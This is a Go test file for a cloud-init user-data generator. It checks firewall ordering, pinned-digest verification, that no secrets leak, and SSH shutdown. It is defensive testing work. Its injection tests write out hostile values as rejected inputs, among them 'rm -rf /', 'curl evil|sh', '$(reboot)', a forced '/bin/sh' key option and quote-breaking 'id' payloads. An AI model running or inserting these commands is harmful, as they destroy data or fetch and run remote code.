package machinelaunch

import (
	"bytes"
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/hex"
	"encoding/pem"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"golang.org/x/crypto/ssh"
	"gopkg.in/yaml.v3"

	"github.com/subgentic/coral/internal/updater/verify"
)

// #9973: the cloud-init user-data: a golden for a fixed spec, what it must always say, and that nothing a caller passes can become shell.

// testClientKey is a fixed ed25519 public key (from a seed of sevens), the launch's login key in the golden.
func testClientKey() string {
	pub := ed25519.NewKeyFromSeed(bytes.Repeat([]byte{7}, 32)).Public().(ed25519.PublicKey)
	k, err := ssh.NewPublicKey(pub)
	if err != nil {
		panic(err)
	}
	return strings.TrimSpace(string(ssh.MarshalAuthorizedKey(k)))
}

// testHostKey is a fixed ed25519 host key pair (from a seed of nines): its private PEM and public line.
func testHostKey() (string, string) {
	priv := ed25519.NewKeyFromSeed(bytes.Repeat([]byte{9}, 32))
	pub, err := ssh.NewPublicKey(priv.Public())
	if err != nil {
		panic(err)
	}
	return string(marshalHostKey(priv)), strings.TrimSpace(string(ssh.MarshalAuthorizedKey(pub)))
}

// testDigests are two fixed digests for the golden (not a real release's).
func testDigests() ReleaseDigests {
	return ReleaseDigests{AMD64: strings.Repeat("1a", 32), ARM64: strings.Repeat("2b", 32)}
}

func goldenSpec() UserDataSpec {
	priv, pub := testHostKey()
	return UserDataSpec{ClientPublicKey: testClientKey(), HostPrivateKey: priv, HostPublicKey: pub, AllowSSHFrom: "203.0.113.9", MaxMode: "launch", CoralVersion: "2.0.3", CoralDigests: testDigests(), Agents: []string{"claude@2.0.0", "codex@0.1.0", "agy@sha256:" + strings.Repeat("ab", 32)}}
}

func TestUserDataMatchesItsGolden(t *testing.T) {
	got, err := BuildUserData(goldenSpec())
	require.NoError(t, err)
	path := filepath.Join("testdata", "userdata.golden.yaml")
	if os.Getenv("UPDATE_USERDATA_GOLDEN") == "1" {
		require.NoError(t, os.WriteFile(path, []byte(got), 0o644))
	}
	want, err := os.ReadFile(path)
	require.NoError(t, err, "run once with UPDATE_USERDATA_GOLDEN=1, then read the file")
	assert.Equal(t, string(want), got, "the user-data changed: read the diff, then UPDATE_USERDATA_GOLDEN=1 go test ./internal/machinelaunch")
}

func TestUserDataSaysWhatItMustAlwaysSay(t *testing.T) {
	got, err := BuildUserData(goldenSpec())
	require.NoError(t, err)
	// valid cloud-config
	var doc map[string]any
	require.NoError(t, yaml.Unmarshal([]byte(got), &doc))
	assert.True(t, strings.HasPrefix(got, "#cloud-config\n"))
	for _, k := range []string{"users", "packages", "write_files", "runcmd"} {
		assert.Contains(t, doc, k)
	}
	users := doc["users"].([]any)
	require.Len(t, users, 1)
	u := users[0].(map[string]any)
	assert.Equal(t, "coral", u["name"])
	assert.Equal(t, true, u["lock_passwd"], "no password")
	assert.NotContains(t, u, "sudo", "no sudo")
	// the login key: one PUBLIC key, key only, nothing forwarded (Security's condition E on #10917)
	keys := u["ssh_authorized_keys"].([]any)
	require.Len(t, keys, 1)
	assert.Equal(t, "no-port-forwarding,no-agent-forwarding,no-X11-forwarding "+testClientKey(), keys[0])
	// the firewall: deny incoming, SSH only from the launcher's address, before anything is downloaded
	i := strings.Index(got, "[ ufw, default, deny, incoming ]")
	j := strings.Index(got, "      /usr/local/sbin/coral-machine-setup\n")
	require.True(t, i > 0 && j > i, "deny incoming comes before the setup step")
	assert.Contains(t, got, "[ ufw, allow, from, '203.0.113.9', to, any, port, '22', proto, tcp ]", "SSH is open to the launcher's address only")
	assert.NotContains(t, got, "[ ufw, allow, 22/tcp ]", "never open to everyone")
	assert.Contains(t, got, "[ ufw, --force, enable ]")
	// the Coral release is verified before it is installed, against the digest the launcher pinned: nothing fetched on the machine decides it (#10919)
	assert.Contains(t, got, "x86_64) arch=amd64; want="+strings.Repeat("1a", 32))
	assert.Contains(t, got, "aarch64) arch=arm64; want="+strings.Repeat("2b", 32))
	assert.Contains(t, got, `echo "${want}  ${tarball}" | sha256sum -c -`)
	assert.Less(t, strings.Index(got, "sha256sum -c -"), strings.Index(got, "tar -xzf"), "checksum before extraction")
	assert.NotContains(t, got, "SHA256SUMS", "no checksum list is fetched on the machine")
	assert.NotContains(t, got, "expected.sum")
	assert.Contains(t, got, "--proto '=https' --tlsv1.2")
	assert.Contains(t, got, "https://github.com/subgentic/coral/releases/download/v${version}")
	assert.Contains(t, got, "set -eu", "it stops at the first failure")
	// no credential, anywhere (#10917, coral-hub Security): it goes over SSH, on standard input, to /run/coral/bootstrap.d/credential after the pin matched
	assert.NotContains(t, got, "chb_", "no Hub credential")
	assert.NotContains(t, got, "printf '%s'", "nothing writes a secret from the user-data")
	// the one secret: exactly ONE ed25519 host key pair (Security's condition F); no other private key, no provider token
	assert.Equal(t, 1, strings.Count(got, "BEGIN OPENSSH PRIVATE KEY"), "exactly one private key block: the host key")
	assert.Equal(t, 1, strings.Count(got, "ed25519_private:"))
	assert.Equal(t, 1, strings.Count(got, "ed25519_public:"))
	assert.NotContains(t, got, "rsa_private", "no other key type")
	assert.NotContains(t, got, "ecdsa_private")
	assert.NotContains(t, got, "dop_v1_", "no provider token")
	assert.NotContains(t, got, "chk_", "no Hub key")
	assert.Contains(t, got, "ssh_deletekeys: true")
	assert.Contains(t, got, "HostKey /etc/ssh/ssh_host_ed25519_key", "sshd presents only that key")
	assert.NotContains(t, got, "set -x", "no shell tracing")
	assert.NotContains(t, got, "set -o xtrace")
	assert.Contains(t, got, "install -d -m 0700 -o coral -g coral /run/coral/bootstrap.d", "the folder the credential goes in: only coral reads it")
	assert.Contains(t, got, "install -d -m 0755 -o root -g root /run/coral\n", "/run/coral stays root's")
	assert.NotContains(t, got, "  - nodejs", "node and npm are not installed before Coral has redeemed")
	// Coral starts only when the credential file appears, never from the user-data
	assert.Contains(t, got, "PathExists=/run/coral/bootstrap.d/credential")
	assert.Contains(t, got, "Unit=coral.service")
	assert.Contains(t, got, "systemctl enable --now coral-bootstrap.path coral-finish.path coral-finish.timer")
	assert.NotContains(t, got, "systemctl enable --now coral.service", "the service is not started from the user-data")
	// the finish step removes every copy of what could open SSH again, and stops AND masks sshd (Security's condition C)
	finish := fileOf(t, doc, "/usr/local/sbin/coral-machine-finish")
	for _, want := range []string{
		"systemctl disable --now ssh.socket ssh.service sshd.service", "systemctl mask ssh.socket ssh.service sshd.service", "ufw --force delete allow 22/tcp",
		"rm -f /home/coral/.ssh/authorized_keys /etc/ssh/ssh_host_*_key /etc/ssh/ssh_host_*_key.pub", "rm -f /etc/ssh/sshd_config.d/10-coral-bootstrap.conf",
		"/var/lib/cloud/instance/user-data.txt*", "/var/lib/cloud/instances/*/user-data.txt*", "cloud-config.txt", "/var/lib/cloud/instance/scripts", "/var/log/cloud-init.log", "systemctl enable coral.service",
	} {
		assert.Contains(t, finish, want, "the finish step: "+want)
	}
	assert.Contains(t, got, "OnActiveSec=20min", "the fallback closes SSH on its own if the launcher never finishes")
	assert.Contains(t, got, "PathExists=/run/coral/bootstrap.d/done", "and the launcher's done file closes it at once")
	sshd := fileOf(t, doc, "/etc/ssh/sshd_config.d/10-coral-bootstrap.conf")
	for _, want := range []string{"PasswordAuthentication no", "PermitRootLogin no", "AllowUsers coral", "AllowTcpForwarding no"} {
		assert.Contains(t, sshd, want)
	}
	// the service: as coral, loopback only, no remote, the chosen cap, the Hub's origin
	assert.Contains(t, got, "User=coral")
	assert.Contains(t, got, "ExecStart=/usr/local/bin/coral --cloud-url https://app.coralhub.dev --cloud-max-mode launch --no-browser --host 127.0.0.1")
	assert.NotContains(t, got, "--remote")
	assert.Contains(t, got, "NoNewPrivileges=true")
	// pinned agents, from the table; agy as coral and only because it was asked for unpinned
	// the agent CLIs come after SSH is closed and Coral is up, from the finish step, and only if Coral is active
	assert.Contains(t, finish, "if systemctl is-active --quiet coral.service; then /usr/local/sbin/coral-machine-agents || true; fi")
	assert.Less(t, strings.Index(finish, "systemctl mask"), strings.Index(finish, "coral-machine-agents"), "SSH is closed before the slow installs")
	assert.NotContains(t, setupOf(t, doc), "npm", "nothing slow before the redeem")
	assert.NotContains(t, setupOf(t, doc), "antigravity")
	assert.Contains(t, got, "npm install -g @anthropic-ai/claude-code@2.0.0")
	assert.Contains(t, got, "npm install -g @openai/codex@0.1.0")
	assert.Contains(t, got, "curl -fsSL --proto '=https' --tlsv1.2 -o \"$installer\" 'https://antigravity.google/cli/install.sh'")
	assert.Contains(t, got, "echo '"+strings.Repeat("ab", 32)+"  '\"$installer\" | sha256sum -c -", "the installer is checked against its pinned hash")
	assert.Less(t, strings.Index(got, `sha256sum -c -`), strings.Index(got, `runuser -u coral -- bash "$installer"`), "checked before it runs")
	assert.NotContains(t, got, "| bash", "no installer is piped into a shell")
}

// setupOf is the content of the setup script (the Coral install, which runs before the credential arrives).
func setupOf(t *testing.T, doc map[string]any) string {
	return fileOf(t, doc, "/usr/local/sbin/coral-machine-setup")
}

// fileOf is the content of a file the user-data writes.
func fileOf(t *testing.T, doc map[string]any, path string) string {
	t.Helper()
	for _, f := range doc["write_files"].([]any) {
		m := f.(map[string]any)
		if m["path"] == path {
			return m["content"].(string)
		}
	}
	t.Fatalf("no file %s", path)
	return ""
}

// A comment on the login key is dropped, never carried into the user-data.
// The canary scan: the user-data of a real launch holds the host private key and the login PUBLIC key, and nothing else that is secret (coral-hub Security): one private key block, and it is the host key.
func TestUserDataOfARealLaunchHoldsOnlyTheHostPrivateKeyAndTheLoginPublicKey(t *testing.T) {
	keys, err := NewBootKeys()
	require.NoError(t, err)
	spec := UserDataSpec{AllowSSHFrom: "203.0.113.9", CoralVersion: "2.0.3", CoralDigests: testDigests()}
	require.NoError(t, keys.FillUserData(&spec))
	got, err := BuildUserData(spec)
	require.NoError(t, err)
	var blocks []*pem.Block
	rest := []byte(strings.ReplaceAll(got, "\n    ", "\n"))
	for {
		var b *pem.Block
		b, rest = pem.Decode(rest)
		if b == nil {
			break
		}
		blocks = append(blocks, b)
	}
	require.Len(t, blocks, 1, "one private key block in the user-data")
	raw, err := ssh.ParseRawPrivateKey(pem.EncodeToMemory(blocks[0]))
	require.NoError(t, err)
	host, ok := raw.(*ed25519.PrivateKey)
	require.True(t, ok)
	assert.True(t, bytes.Equal(*host, keys.hostPriv), "and it is the host key, never the login key")
	assert.Contains(t, got, keys.ClientPublic, "the login key is there as a public key")
	assert.NotContains(t, got, "chb_")
	assert.NotContains(t, got, "dop_v1_")
}

func TestALoginKeyCommentIsDropped(t *testing.T) {
	s := goldenSpec()
	s.ClientPublicKey = testClientKey() + " ZZINJECT'; id; '"
	got, err := BuildUserData(s)
	require.NoError(t, err)
	assert.NotContains(t, got, "ZZINJECT")
}

func TestTheDefaultsAreTheSafeOnes(t *testing.T) {
	hp, hu := testHostKey()
	got, err := BuildUserData(UserDataSpec{ClientPublicKey: testClientKey(), HostPrivateKey: hp, HostPublicKey: hu, AllowSSHFrom: "203.0.113.9", CoralVersion: "2.0.3", CoralDigests: testDigests()})
	require.NoError(t, err)
	assert.Contains(t, got, "--cloud-max-mode view", "an empty cap is view")
	assert.NotContains(t, got, "npm install", "no agents unless named")
	assert.NotContains(t, got, "antigravity")
	assert.NotContains(t, got, "coral-machine-agents", "and no agents step at all")
	assert.NotContains(t, got, "/usr/local/sbin/coral-machine-agents", "the finish step has none either")
}

func TestNothingACallerPassesCanBecomeShell(t *testing.T) {
	ok := goldenSpec()
	bad := map[string]func(*UserDataSpec){
		"no login key":                  func(s *UserDataSpec) { s.ClientPublicKey = "" },
		"a login key that is not a key": func(s *UserDataSpec) { s.ClientPublicKey = "ssh-ed25519 AAAA not-a-key" },
		"a login key with options":      func(s *UserDataSpec) { s.ClientPublicKey = "command=\"/bin/sh\" " + testClientKey() },
		"a login key and a second line": func(s *UserDataSpec) { s.ClientPublicKey = testClientKey() + "\n" + testClientKey() },
		"no host key":                   func(s *UserDataSpec) { s.HostPrivateKey, s.HostPublicKey = "", "" },
		"a host private key that is junk": func(s *UserDataSpec) {
			s.HostPrivateKey = "-----BEGIN OPENSSH PRIVATE KEY-----\nnot a key\n-----END OPENSSH PRIVATE KEY-----\n"
		},
		"a host public key of another key":  func(s *UserDataSpec) { s.HostPublicKey = testClientKey() },
		"a host public key with options":    func(s *UserDataSpec) { s.HostPublicKey = "command=\"id\" " + s.HostPublicKey },
		"a host key pair with no public":    func(s *UserDataSpec) { s.HostPublicKey = "" },
		"no coral digests":                  func(s *UserDataSpec) { s.CoralDigests = ReleaseDigests{} },
		"one coral digest only":             func(s *UserDataSpec) { s.CoralDigests.ARM64 = "" },
		"a digest in capitals":              func(s *UserDataSpec) { s.CoralDigests.AMD64 = strings.Repeat("AB", 32) },
		"a digest too short":                func(s *UserDataSpec) { s.CoralDigests.AMD64 = "abcd" },
		"a digest with a command":           func(s *UserDataSpec) { s.CoralDigests.AMD64 = strings.Repeat("ab", 31) + "a; rm -rf /" },
		"no ssh source":                     func(s *UserDataSpec) { s.AllowSSHFrom = "" },
		"every address":                     func(s *UserDataSpec) { s.AllowSSHFrom = "0.0.0.0" },
		"every address as a CIDR":           func(s *UserDataSpec) { s.AllowSSHFrom = "0.0.0.0/0" },
		"an ssh source host name":           func(s *UserDataSpec) { s.AllowSSHFrom = "example.com" },
		"an ssh source with a command":      func(s *UserDataSpec) { s.AllowSSHFrom = "203.0.113.9; reboot" },
		"a max mode that is a command":      func(s *UserDataSpec) { s.MaxMode = "launch; rm -rf /" },
		"a max mode in capitals":            func(s *UserDataSpec) { s.MaxMode = "LAUNCH" },
		"a version with a command":          func(s *UserDataSpec) { s.CoralVersion = "2.0.3; curl evil|sh" },
		"a v-prefixed version":              func(s *UserDataSpec) { s.CoralVersion = "v2.0.3" },
		"a prerelease Coral":                func(s *UserDataSpec) { s.CoralVersion = "2.0.3-rc1" },
		"no version":                        func(s *UserDataSpec) { s.CoralVersion = "" },
		"a hub url with a path":             func(s *UserDataSpec) { s.HubURL = "https://hub.example/x" },
		"a hub url over http":               func(s *UserDataSpec) { s.HubURL = "http://app.coralhub.dev" },
		"a hub url with a shell escape":     func(s *UserDataSpec) { s.HubURL = "https://a.b$(reboot)" },
		"an unpinned npm agent":             func(s *UserDataSpec) { s.Agents = []string{"claude"} },
		"an npm agent said unpinned":        func(s *UserDataSpec) { s.Agents = []string{"claude@unpinned"} },
		"an agent version with a quote":     func(s *UserDataSpec) { s.Agents = []string{"claude@1.0.0';id;'"} },
		"an agent version with a space":     func(s *UserDataSpec) { s.Agents = []string{"codex@1.0.0 --foo"} },
		"agy pinned by version":             func(s *UserDataSpec) { s.Agents = []string{"agy@1.2.3"} },
		"agy unpinned":                      func(s *UserDataSpec) { s.Agents = []string{"agy@unpinned"} },
		"agy with a short hash":             func(s *UserDataSpec) { s.Agents = []string{"agy@sha256:abc"} },
		"agy with an upper-case hash":       func(s *UserDataSpec) { s.Agents = []string{"agy@sha256:" + strings.Repeat("AB", 32)} },
		"an agent that is not in the table": func(s *UserDataSpec) { s.Agents = []string{"evil@1.0.0"} },
		"a terminal":                        func(s *UserDataSpec) { s.Agents = []string{"terminal@1.0.0"} },
		"an agent twice":                    func(s *UserDataSpec) { s.Agents = []string{"claude@1.0.0", "claude@1.0.1"} },
		"agy twice by two names": func(s *UserDataSpec) {
			s.Agents = []string{"agy@sha256:" + strings.Repeat("ab", 32), "gemini@sha256:" + strings.Repeat("cd", 32)}
		},
	}
	for name, mut := range bad {
		s := ok
		s.Agents = append([]string(nil), ok.Agents...)
		mut(&s)
		_, err := BuildUserData(s)
		assert.Error(t, err, name)
	}
}

func TestTheSetupScriptIsValidShellAndTheRepoMatchesTheUpdater(t *testing.T) {
	assert.Equal(t, verify.Repo, coralRepo, "the release repository is the updater's")
	if runtime.GOOS == "windows" {
		t.Skip("sh -n is checked where there is a sh")
	}
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no sh")
	}
	got, err := BuildUserData(goldenSpec())
	require.NoError(t, err)
	var doc struct {
		WriteFiles []struct {
			Path    string `yaml:"path"`
			Content string `yaml:"content"`
		} `yaml:"write_files"`
		Runcmd []any `yaml:"runcmd"`
	}
	require.NoError(t, yaml.Unmarshal([]byte(got), &doc))
	checked := 0
	for _, f := range doc.WriteFiles {
		if strings.HasPrefix(f.Path, "/usr/local/sbin/coral-machine-") {
			require.NoError(t, exec.Command(sh, "-n", "-c", f.Content).Run(), "%s parses", f.Path)
			checked++
		}
	}
	for _, r := range doc.Runcmd {
		if s, ok := r.(string); ok {
			require.NoError(t, exec.Command(sh, "-n", "-c", s).Run(), "the runcmd step parses")
			checked++
		}
	}
	assert.Equal(t, 4, checked, "the setup script, the agents script, the Coral step and the agents step")
}

// The hand-written OpenSSH key format is the one sshd reads: ssh-keygen derives the public key from it, and it is the pinned one.
func TestTheHostKeyFileIsReadByOpenSSH(t *testing.T) {
	kg, err := exec.LookPath("ssh-keygen")
	if err != nil {
		t.Skip("no ssh-keygen")
	}
	priv, pub := testHostKey()
	f := filepath.Join(t.TempDir(), "host_key")
	require.NoError(t, os.WriteFile(f, []byte(priv), 0o600))
	out, err := exec.Command(kg, "-y", "-f", f).Output()
	require.NoError(t, err, "ssh-keygen reads the key")
	got, _, _, _, err := ssh.ParseAuthorizedKey(out)
	require.NoError(t, err)
	want, _, _, _, err := ssh.ParseAuthorizedKey([]byte(pub))
	require.NoError(t, err)
	assert.Equal(t, want.Marshal(), got.Marshal(), "the public half ssh-keygen derives is the pinned one")
}

// The setup script run for real, with curl and tar stubbed: a download whose SHA-256 is the pinned one is extracted; any other is not, and the script stops there (a digest mismatch aborts, #10919).
func TestTheSetupScriptAbortsOnADigestMismatch(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("needs sh")
	}
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no sh")
	}
	run := func(content string, pinned ReleaseDigests) (extracted bool, output string) {
		dir := t.TempDir()
		bin := filepath.Join(dir, "bin")
		require.NoError(t, os.MkdirAll(bin, 0o755))
		fixture := filepath.Join(dir, "fixture")
		require.NoError(t, os.WriteFile(fixture, []byte(content), 0o644))
		marker := filepath.Join(dir, "extracted")
		stub := func(name, body string) {
			require.NoError(t, os.WriteFile(filepath.Join(bin, name), []byte("#!/bin/sh\n"+body+"\n"), 0o755))
		}
		stub("curl", `while [ $# -gt 0 ]; do if [ "$1" = -o ]; then cp '`+fixture+`' "$2"; fi; shift; done`) // writes the fixture where -o says
		stub("tar", "touch '"+marker+"'")
		if _, e1 := os.Stat("/usr/bin/sha256sum"); e1 != nil {
			if _, e2 := os.Stat("/bin/sha256sum"); e2 != nil {
				stub("sha256sum", `exec /usr/bin/shasum -a 256 "$@"`) // a Mac has shasum, not sha256sum
			}
		}
		stub("uname", "echo x86_64") // the amd64 line of the script, whatever this computer is
		script := filepath.Join(dir, "setup.sh")
		require.NoError(t, os.WriteFile(script, []byte(setupScript("2.0.3", pinned)), 0o755))
		cmd := exec.Command(sh, script)
		cmd.Env = []string{"PATH=" + bin + ":/usr/bin:/bin", "HOME=" + dir, "TMPDIR=" + dir}
		out, _ := cmd.CombinedOutput() // it ends at the last check (no /usr/local/bin/coral here): only whether tar ran matters
		_, statErr := os.Stat(marker)
		return statErr == nil, string(out)
	}
	good := "a tarball the launcher pinned"
	sum := sha256.Sum256([]byte(good))
	hexSum := hex.EncodeToString(sum[:])
	pin := ReleaseDigests{AMD64: hexSum, ARM64: strings.Repeat("0", 64)}
	extracted, out := run(good, pin)
	assert.True(t, extracted, "a download that is the pinned one is extracted: "+out)
	extracted, out = run(good+" swapped", pin)
	assert.False(t, extracted, "a swapped download is never extracted: "+out)
	assert.Contains(t, out, "FAILED", "and the checksum says so")
}
